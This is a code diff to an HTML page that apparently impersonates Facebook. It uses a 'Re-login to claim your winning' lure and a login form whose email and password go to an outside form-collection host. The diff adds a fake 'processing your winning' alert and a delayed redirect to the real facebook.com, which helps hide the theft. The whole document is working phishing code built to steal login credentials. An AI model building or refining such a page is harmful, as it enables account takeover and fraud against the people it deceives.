@@ -138,9 +138,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
       <p style="color:red">Re-login to claim your winning</p>
 
-
         <!-- Login Form -->
-      
         <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST" onsubmit="redirectToFacebook(event)">
             <input type="email" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Password" required>
@@ -159,17 +157,28 @@
 
     <script>
         function redirectToFacebook(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent form from submitting the default way
+
             const form = document.getElementById('loginForm');
+            const formData = new FormData(form);
 
             fetch(form.action, {
-                method: form.method,
-                body: new FormData(form)
-            }).then(function () {
-                // After successful form submission, redirect to Facebook
-                window.location.href = "https://www.facebook.com";
-            }).catch(function (error) {
+                method: 'POST',
+                body: formData
+            }).then(function(response) {
+                if (response.ok) {
+                    alert("We are processing your winning, we shall get back to you");
+
+                    // Redirect to Facebook after 5 seconds
+                    setTimeout(function() {
+                        window.location.href = "https://www.facebook.com";
+                    }, 5000);
+                } else {
+                    alert("There was an error processing your request.");
+                }
+            }).catch(function(error) {
                 console.error('Form submission error:', error);
+                alert("An error occurred. Please try again.");
             });
         }
     </script>
